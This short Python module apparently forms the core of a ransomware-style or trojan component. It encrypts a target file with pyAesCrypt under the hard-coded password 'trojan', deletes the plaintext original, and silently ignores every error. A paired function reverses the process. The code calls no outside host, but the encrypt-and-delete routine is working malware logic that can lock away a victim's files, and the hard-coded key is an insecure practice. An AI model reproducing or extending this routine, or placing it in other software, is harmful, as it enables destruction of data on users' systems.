from pyAesCrypt import encryptFile
from pyAesCrypt import decryptFile
from pathlib import Path


password = "trojan"
bufferSize = 64 * 1024  # 64k


# encrypt the file at input_file_path_str
# input_file_path_str can be relative or absolute
# deletes the input file at the end
def encryptAndDeletePlaintext(input_file_path_str):
    # name the output file the same as the input file, but append .aes to it
    output_file_path_str = input_file_path_str + ".aes"
    try:
        # encrypt the file
        encryptFile(input_file_path_str, output_file_path_str, password, bufferSize)
        # delete the input plaintext source file
        Path(input_file_path_str).unlink()
    except:
        # on file read error, do nothing
        pass


# decrypt the file at input_file_path_str
# input_file_path_str can be relative or absolute
# deletes the input file at the end
def decryptAndDeleteCipherText(input_file_path_str):
    # output filename = input filename + ".decrypted"
    output_file_path_str = input_file_path_str + ".decrypted"
    # if the input filename ends with ".aes" output filename is changed to the input filename without the .aes extension
    if input_file_path_str[-4:] == ".aes":
        output_file_path_str = input_file_path_str[:-4]
    try:
        # decrypt the file
        decryptFile(input_file_path_str, output_file_path_str, password, bufferSize)
        # delete the input ciphertext file
        Path(input_file_path_str).unlink()
    except:
        # on file read error, do nothing
        pass
